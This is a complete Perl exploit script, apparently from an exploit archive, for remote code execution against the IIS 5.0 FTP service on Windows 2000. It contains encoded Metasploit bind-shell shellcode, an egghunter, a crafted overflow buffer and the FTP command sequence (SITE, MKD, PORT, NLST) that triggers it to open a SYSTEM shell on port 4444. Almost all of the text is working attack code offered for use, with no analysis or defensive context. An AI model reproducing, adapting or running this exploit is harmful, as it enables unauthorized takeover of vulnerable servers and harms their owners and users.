#!/usr/bin/perl
# IIS 5.0 FTP Server / Remote SYSTEM exploit 
# Win2k SP4 targets 
# bug found & exploited by Kingcope, kcope2<at>googlemail.com 
# Affects IIS6 with stack cookie protection 
# Modded by muts, additional egghunter added for secondary larger payload
# Might take a minute or two for the egg to be found.
# Opens bind shell on port 4444

# http://www.offensive-security.com/0day/msftp.pl.txt

use IO::Socket; 
$|=1; 
$sc = "\x89\xe2\xdd\xc5\xd9\x72\xf4\x5f\x57\x59\x49\x49\x49\x49\x43" .
"\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34" .
"\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41" .
"\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58" .
"\x50\x38\x41\x43\x4a\x4a\x49\x45\x36\x4d\x51\x48\x4a\x4b\x4f" .
"\x44\x4f\x47\x32\x46\x32\x42\x4a\x43\x32\x46\x38\x48\x4d\x46" .
"\x4e\x47\x4c\x45\x55\x51\x4a\x44\x34\x4a\x4f\x48\x38\x46\x34" .
"\x50\x30\x46\x50\x50\x57\x4c\x4b\x4b\x4a\x4e\x4f\x44\x35\x4a" .
"\x4a\x4e\x4f\x43\x45\x4b\x57\x4b\x4f\x4d\x37\x41\x41";
# ./msfpayload windows/shell_bind_tcp R |  ./msfencode -e x86/shikata_ga_nai -b "\x00\x0a\x0d"

$shell="T00WT00W" ."\xda\xde\xbd\x2d\xe7\x9b\x9f\x2b\xc9\xb1\x56\xd9\x74\x24\xf4" .
"\x5a\x83\xea\xfc\x31\x6a\x15\x03\x6a\x15\xcf\x12\x67\x77\x86" .
"\xdd\x98\x88\xf8\x54\x7d\xb9\x2a\x02\xf5\xe8\xfa\x40\x5b\x01" .
"\x71\x04\x48\x92\xf7\x81\x7f\x13\xbd\xf7\x4e\xa4\x70\x38\x1c" .
"\x66\x13\xc4\x5f\xbb\xf3\xf5\xaf\xce\xf2\x32\xcd\x21\xa6\xeb" .
"\x99\x90\x56\x9f\xdc\x28\x57\x4f\x6b\x10\x2f\xea\xac\xe5\x85" .
"\xf5\xfc\x56\x92\xbe\xe4\xdd\xfc\x1e\x14\x31\x1f\x62\x5f\x3e" .
"\xeb\x10\x5e\x96\x22\xd8\x50\xd6\xe8\xe7\x5c\xdb\xf1\x20\x5a" .
"\x04\x84\x5a\x98\xb9\x9e\x98\xe2\x65\x2b\x3d\x44\xed\x8b\xe5" .
"\x74\x22\x4d\x6d\x7a\x8f\x1a\x29\x9f\x0e\xcf\x41\x9b\x9b\xee" .
"\x85\x2d\xdf\xd4\x01\x75\xbb\x75\x13\xd3\x6a\x8a\x43\xbb\xd3" .
"\x2e\x0f\x2e\x07\x48\x52\x27\xe4\x66\x6d\xb7\x62\xf1\x1e\x85" .
"\x2d\xa9\x88\xa5\xa6\x77\x4e\xc9\x9c\xcf\xc0\x34\x1f\x2f\xc8" .
"\xf2\x4b\x7f\x62\xd2\xf3\x14\x72\xdb\x21\xba\x22\x73\x9a\x7a" .
"\x93\x33\x4a\x12\xf9\xbb\xb5\x02\x02\x16\xc0\x05\xcc\x42\x80" .
"\xe1\x2d\x75\x36\xad\xb8\x93\x52\x5d\xed\x0c\xcb\x9f\xca\x84" .
"\x6c\xe0\x38\xb9\x25\x76\x74\xd7\xf2\x79\x85\xfd\x50\xd6\x2d" .
"\x96\x22\x34\xea\x87\x34\x11\x5a\xc1\x0c\xf1\x10\xbf\xdf\x60" .
"\x24\xea\x88\x01\xb7\x71\x49\x4c\xa4\x2d\x1e\x19\x1a\x24\xca" .
"\xb7\x05\x9e\xe9\x4a\xd3\xd9\xaa\x90\x20\xe7\x33\x55\x1c\xc3" .
"\x23\xa3\x9d\x4f\x10\x7b\xc8\x19\xce\x3d\xa2\xeb\xb8\x97\x19" .
"\xa2\x2c\x6e\x52\x75\x2b\x6f\xbf\x03\xd3\xc1\x16\x52\xeb\xed" .
"\xfe\x52\x94\x10\x9f\x9d\x4f\x91\xbf\x7f\x5a\xef\x57\x26\x0f" .
"\x52\x3a\xd9\xe5\x90\x43\x5a\x0c\x68\xb0\x42\x65\x6d\xfc\xc4" .
"\x95\x1f\x6d\xa1\x99\x8c\x8e\xe0\x90";


print "IIS 5.0 FTPd / Remote r00t exploit by kcope V1.2\n"; 
if ($#ARGV ne 1) { 
print "usage: iiz5.pl <target> <your local ip>\n"; 
exit(0); 
} 
srand(time()); 
$port = int(rand(31337-1022)) + 1025; 
$locip = $ARGV[1]; 
$locip =~ s/\./,/gi; 
if (fork()) { 
$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0], 
                              PeerPort => '21', 
                              Proto    => 'tcp'); 
$patch = "\x7E\xF1\xFA\x7F";
$retaddr = "\x9B\xB1\xF4\x77"; # JMP ESP univ on 2 win2k platforms 

$v = "KSEXY" . $sc . "V" x (500-length($sc)-5); 
# top address of stack frame where shellcode resides, is hardcoded inside this block 
$findsc="\xB8\x55\x55\x52\x55\x35\x55\x55\x55\x55\x40\x81\x38\x53" 
   ."\x45\x58\x59\x75\xF7\x40\x40\x40\x40\xFF\xFF\xE0"; 

# attack buffer 
$c = $findsc . "C" . ($patch x (76/4)) . $patch.$patch. 
   ($patch x (52/4)) .$patch."EEEE$retaddr".$patch. 
   "HHHHIIII". 
$patch."JKKK"."\xE9\x63\xFE\xFF\xFF\xFF\xFF"."NNNN"; 
$x = <$sock>; 
print $x;                             
print $sock "USER anonimoos\r\n"; 
$x = <$sock>; 
print $x; 
print $sock "PASS $shell\r\n";
$x = <$sock>; 
print $x; 
print $sock "USER anonimoos\r\n"; 
$x = <$sock>; 
print $x; 
print $sock "PASS $shell\r\n";
$x = <$sock>; 
print $x; 

print $sock "USER anonymous\r\n"; 
$x = <$sock>; 
print $x; 
print $sock "PASS anonymous\r\n"; 
$x = <$sock>; 
print $x; 
print $sock "MKD w00t$port\r\n"; 
$x = <$sock>; 
print $x; 
print $sock "SITE $v\r\n"; # We store shellcode in memory of process (stack) 
$x = <$sock>; 
print $x; 
print $sock "SITE $v\r\n"; 
$x = <$sock>; 
print $x; 
print $sock "SITE $v\r\n"; 
$x = <$sock>;
print $x; 
print $sock "SITE $v\r\n"; 
$x = <$sock>; 
print $x; 
print $sock "SITE $v\r\n"; 
$x = <$sock>; 
print $x; 
print $sock "CWD w00t$port\r\n"; 
$x = <$sock>; 
print $x; 
print $sock "MKD CCC". "$c\r\n"; 
$x = <$sock>; 
print $x; 
print $sock "PORT $locip," . int($port / 256) . "," . int($port % 256) . "\r\n"; 
$x = <$sock>; 
print $x; 
# TRIGGER 
print $sock "NLST $c*/../C*/\r\n"; 
$x = <$sock>; 
print $x; 
while (1) {} 
} else { 
my $servsock = IO::Socket::INET->new(LocalAddr => "0.0.0.0", LocalPort => $port, Proto => 'tcp', Listen => 1); 
die "Could not create socket: $!\n" unless $servsock; 
my $new_sock = $servsock->accept(); 
while(<$new_sock>) { 
print $_; 
} 
close($servsock); 
} 
#Cheerio, 
# 
#Kingcope

# milw0rm.com [2009-09-01]